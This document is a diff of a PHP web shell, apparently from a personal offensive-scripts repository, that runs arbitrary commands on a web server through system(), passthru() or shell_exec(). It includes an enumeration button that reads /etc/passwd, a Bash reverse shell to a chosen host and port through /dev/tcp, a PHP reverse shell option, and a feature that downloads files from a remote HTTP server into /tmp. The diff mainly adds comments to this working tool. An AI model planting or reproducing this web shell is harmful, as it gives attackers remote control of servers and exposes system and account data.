@@ -1,25 +1,33 @@
-                                                                 
 <!DOCTYPE html>
 <html>
+<!-- Simple host exploration script: basic host enumeration using PHP -->
+<!-- https://github.com/isabellecda/cyber-scripts -->
 <form  method="POST">
 	Command:        
+	<!-- Commands sent using POST method-->
 	<input type="text" name="mycmd">
-        <input type="submit" name="btnGet" value="POST">
+        <input type="submit" name="btnPost" value="POST">
+	<!-- Basic enum commands -->
 	<input type="submit" name="btnEnum" value="Auto Enum">
 	<br><br>
 	Reverse:
-	<input type="text" name="lhost" value="192.168.10.10" size="10">
+	<!-- Will try to get a reverse shell --> 
+	<!-- Handler must be listening at the defined host and port -->
+	<input type="text" name="lhost" value="10.10.10.10" size="10">
 	<input type="text" name="lport" value="1234" size="5">
 	<input type="submit" name="btnBash" value="Reverse Bash">
 	<input type="submit" name="btnPhp" value="Reverse PHP">
 	<br><br>
 	HTTP Server:
-	<input type="text" name="fileHost" value="192.168.10.10" size="10">
-	<input type="text" name="filePort" value="8055" size="5">
+	<!-- HTTP server must be available at the defined host and port -->
+	<!-- File will be download from HTTP server (http://host:port/fileName) to the PHP server (/tmp/fileName) -->
+	<input type="text" name="fileHost" value="10.10.10.10" size="10">
+	<input type="text" name="filePort" value="1235" size="5">
 	<input type="text" name="fileName" value="">
 	<input type="submit" name="btnFile" value="Get file">
 	<br><br>
 	Using:
+	<!-- Defines PHP function to sent the comands. Default is system() -->
 	<input type="radio" name="radio" value="system" checked="checked">system()
 	<input type="radio" name="radio" value="passthru">passthru()
 	<input type="radio" name="radio" value="shell_exec">shell_exec()
@@ -37,7 +45,7 @@
 	$cmdType = $_REQUEST['radio'];
 
 	if (isset($_REQUEST['btnEnum'])) {
-		$cmd = "whoami; id; ip a; cat /etc/passwd";
+		$cmd = "whoami; id; pwd; ip a; cat /etc/passwd";
 	} else if (isset($_REQUEST['btnBash'])) {
 		$cmd = "/bin/bash -c '/bin/bash -i >& /dev/tcp/$lhost/$lport 0>&1'";
 	} else if (isset($_REQUEST['btnPhp'])) {
@@ -48,14 +56,11 @@
 		$cmd = $_REQUEST['mycmd'];
 	}
 
-	
-	echo ('<br>');
-	echo ('<hr>'); 	
-      
-	echo ('<br>');
+	echo ('<br><hr><br>');
+
         echo("# $cmd");
-        echo ('<br>');
-	echo ('<br>');
+
+        echo ('<br><br>');
 
 	if ($cmdType == "passthru") {
 		passthru("$cmd 2>&1", $return_value);
